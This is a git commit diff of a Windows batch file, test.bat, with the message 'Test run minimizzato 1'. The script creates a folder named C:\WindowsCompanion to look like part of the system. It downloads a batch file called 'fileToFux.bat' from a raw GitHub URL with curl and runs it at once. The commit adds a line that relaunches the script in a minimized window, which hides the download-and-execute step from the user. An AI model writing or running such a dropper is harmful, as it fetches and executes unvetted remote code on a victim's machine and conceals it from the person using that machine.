0838aaa0e203a4e6863b89356e8443108b558e32
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 12:44:20 +0100

    Test run minimizzato 1

--- test.bat
+++ test.bat
@@ -1,12 +1,15 @@
 @echo off
-if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"
 
-set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 
-set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat
-
-set DESTINATION_FOLDER=C:\WindowsCompanion
-
-curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"
+    if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"
+    
+    set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
+    
+    set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat
+    
+    set DESTINATION_FOLDER=C:\WindowsCompanion
+    
+    curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"
 
 exit
